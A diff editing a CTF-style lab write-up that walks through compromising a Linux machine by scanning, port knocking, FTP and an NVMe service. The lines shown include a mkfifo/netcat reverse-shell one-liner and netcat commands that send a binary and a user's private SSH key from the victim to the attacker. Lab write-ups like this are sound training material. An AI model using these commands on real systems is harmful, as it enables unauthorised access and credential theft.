@@ -6,7 +6,7 @@ First I checked the connection with a ping to the machine
 
 ![Ping](Img/Ping.png)
 
-Based on the ttl we know is a linux machine, nos I scan the ports and services of the machine with nmap.
+Based on the ttl I know is a linux machine, nos I scan the ports and services of the machine with nmap.
 
 ```bash
 nmap <IP> -p- --open -sS --min-rate 5000 -Pn -n -vvv -oG allports
@@ -22,11 +22,11 @@ nmap <IP> -p22,4420,8080 -sCV -oN targeted
 
 The results of nmap are:
 - 22 <- ssh - I don't have any credentials.
-- 4420 <- nvm-express - Searching information about the service i found that is a NVMe storage service that is accessible on the network
+- 4420 <- nvm-express - Searching information about the service I found that is a NVMe storage service that is accessible on the network
 - 8080 <- Web page
 ### NVM-express scan
 
-First I'm going to check if i can access to the NVMe service because it can have access to sensitive data, unfortunately the service ask me for credentials
+First I'm going to check if I can access to the NVMe service because it can have access to sensitive data, unfortunately the service ask me for credentials
 
 ### Web scan
 
@@ -42,7 +42,7 @@ Browsing in the web page I found this blog:
 
 In this post knock knock makes reference to port knocking, port knocking is a technique that if you make a connection to some ports, you can discover a port that has been hidden with a firewall.
 
-Searching for information I found a python script in this [repository](https://github.com/eliemoutran/KnockIt) and i executed it like this:
+Searching for information I found a python script in this [repository](https://github.com/eliemoutran/KnockIt) and I executed it like this:
 
 ```bash
 python3 knockit.py -b <IP> 1111 2222 3333 4444
@@ -56,7 +56,7 @@ After I executed the exploit I have done another nmap scan, that scan reveled me
 I entered to the FTP service with a anonymous session and I saw a file named note.txt and I downloaded to my machine.
 ### NVMe enumeration
 
-The note contains a credential for the NVMe service so i can connect with netcat.
+The note contains a credential for the NVMe service so I can connect with netcat.
 
 ```bash
 nc -nv <IP> 4420
@@ -70,13 +70,12 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> <PORT> >/tmp/f
 
 Now I'm not in a limited shell, I can move through the directories and  I can execute the runme script.
 
-El script runme pide contraseña asi que se me ha ocurrido ver los strings del archivo, para eso hay que mandarnoslo con netcat de la siguiente manera
 The runme script ask me for password so I through to see the strings of the file, to do that I have to move the file to my machine, for do that I used netcat
 
 ```bash
-# nuestra maquina
+# our machine
 nc -lvnp <PORT> > runme
-# maquina victima
+# victim machine
 nc <IP> <PORT> < /home/catlover/runme
 ```
 
@@ -91,9 +90,9 @@ Using the obtained credential I can execute the script and the script created a 
 I send with netcat the private key to my machine.
 
 ```bash
-# nuestra maquina
+# our machine
 nc -lvnp <PORT> > id_rsa
-# maquina victima
+# victim machine
 nc <IP> <PORT> < /home/catlover/id_rsa
 ```
 
